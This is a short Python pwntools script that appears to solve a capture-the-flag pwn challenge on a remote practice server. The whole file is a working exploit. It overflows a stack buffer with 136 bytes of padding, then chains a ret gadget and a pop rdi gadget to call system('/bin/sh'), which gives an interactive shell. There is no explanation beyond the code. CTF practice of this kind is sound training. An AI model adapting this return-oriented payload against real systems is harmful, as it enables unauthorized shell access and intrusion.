from pwn import *
context.binary = exe = ELF('./14')


def conn():
    if args.LOCAL:
        r = process(exe.path)
        gdb.attach(r, gdbscript='''
                   b*vulnerable_function+40
                   c
                   ''')
    else:
        r = remote("node4.buuoj.cn", 29126)
    return r


def main():
    r = conn()
    input()
    pop_rdi = 0x00000000004006b3
    ret = 0x00000000004004a1
    payload = b'a'*136
    payload += p64(ret)
    payload += p64(pop_rdi) + p64(next(exe.search(b'/bin/sh')))
    payload += p64(exe.sym['system'])
    r.sendafter(b'Input:\n', payload)
    r.interactive()


if __name__ == '__main__':
    main()
